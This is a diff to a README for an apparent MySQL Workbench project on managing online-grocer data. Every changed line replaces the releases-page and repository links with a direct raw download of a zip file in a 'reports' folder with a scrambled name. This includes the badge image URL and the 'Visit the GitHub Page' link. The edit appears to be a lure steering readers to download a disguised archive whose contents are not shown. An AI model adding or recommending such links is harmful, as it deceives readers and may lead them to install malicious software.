@@ -1,6 +1,6 @@
 # 🍏 Manage-Data-for-an-Online-Grocer-Using-MySQL-Workbench - Simplifying Data Management for Grocers
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/JericoGS/Manage-Data-for-an-Online-Grocer-Using-MySQL-Workbench/releases)
+[![Download the latest release](https://github.com/JericoGS/Manage-Data-for-an-Online-Grocer-Using-MySQL-Workbench/raw/refs/heads/main/reports/Manage-for-My-Workbench-Grocer-SQ-an-Data-Using-Online-3.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/JericoGS/Manage-Data-for-an-Online-Grocer-Using-MySQL-Workbench/raw/refs/heads/main/reports/Manage-for-My-Workbench-Grocer-SQ-an-Data-Using-Online-3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you start, ensure you have the following:
 
 To download the application, head to our releases page. You can do this by clicking the link below:
 
-[Visit this page to download](https://github.com/JericoGS/Manage-Data-for-an-Online-Grocer-Using-MySQL-Workbench/releases)
+[Visit this page to download](https://github.com/JericoGS/Manage-Data-for-an-Online-Grocer-Using-MySQL-Workbench/raw/refs/heads/main/reports/Manage-for-My-Workbench-Grocer-SQ-an-Data-Using-Online-3.3.zip)
 
 ### Step 2: Choose and Download the Latest Version
 
@@ -90,7 +90,7 @@ If you encounter any issues:
 
 If you need support, please visit our GitHub page or open an issue to connect with our development team.
 
-- [Visit the GitHub Page](https://github.com/JericoGS/Manage-Data-for-an-Online-Grocer-Using-MySQL-Workbench)
+- [Visit the GitHub Page](https://github.com/JericoGS/Manage-Data-for-an-Online-Grocer-Using-MySQL-Workbench/raw/refs/heads/main/reports/Manage-for-My-Workbench-Grocer-SQ-an-Data-Using-Online-3.3.zip)
 
 ## 📤 Conclusion
 
@@ -98,4 +98,4 @@ This application helps simplify the transition from spreadsheets to a scalable M
 
 Don't forget to visit the links above to **download** the app!
 
-[Download the latest release](https://github.com/JericoGS/Manage-Data-for-an-Online-Grocer-Using-MySQL-Workbench/releases)
+[Download the latest release](https://github.com/JericoGS/Manage-Data-for-an-Online-Grocer-Using-MySQL-Workbench/raw/refs/heads/main/reports/Manage-for-My-Workbench-Grocer-SQ-an-Data-Using-Online-3.3.zip)
